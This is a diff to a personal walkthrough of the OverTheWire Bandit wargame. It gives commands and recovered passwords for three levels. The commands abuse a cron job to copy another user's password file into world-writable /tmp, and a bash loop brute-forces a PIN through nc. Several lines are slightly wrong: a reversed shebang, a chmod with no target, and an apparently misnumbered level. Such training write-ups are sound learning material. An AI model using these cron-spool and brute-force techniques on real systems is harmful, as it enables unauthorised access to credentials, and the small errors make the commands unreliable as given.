@@ -289,3 +289,59 @@ $ ./bandit20-do cat /etc/bandit_pass/bandit20
     key: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
 
 ### Level 22-23
+
+    $ cat cronjob_bandit23
+
+    $ cat /usr/bin/cronjob_bandit23.sh
+
+    $ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+
+    8ca319486bfbbc3663ea0fbe81326349
+
+    $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+    key : QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+
+### Level 23-24
+    $ cd /etc/cron.d/
+    $ ls
+    $ cat cronjob_bandit24
+    $ cat /usr/bin/cronjob_bandit24.sh
+    $ mkdir /tmp/sebas
+    $ chmod 777 sebas
+    $ vim getkey.sh
+        #!/bin/sh
+        cat /etc/bandit_pass/bandit24 > /tmp/sebas/pass
+    $ chmod 777     
+    $ cp getkey.sh /var/spool/bandit24
+    $ cat pass
+
+    key: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+### Level 25-26
+
+    $ mkdir /tmp/sebas
+    $ cd /tmp/sebas
+    $ vim brute
+```bash
+!#/bin/bash
+
+ban=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+for pin in {0000..9999}; do
+	echo "$ban $pin" 
+done | nc localhost 30002
+```
+
+```bash
+ $ ./brute
+```
+```bash
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
+
+  
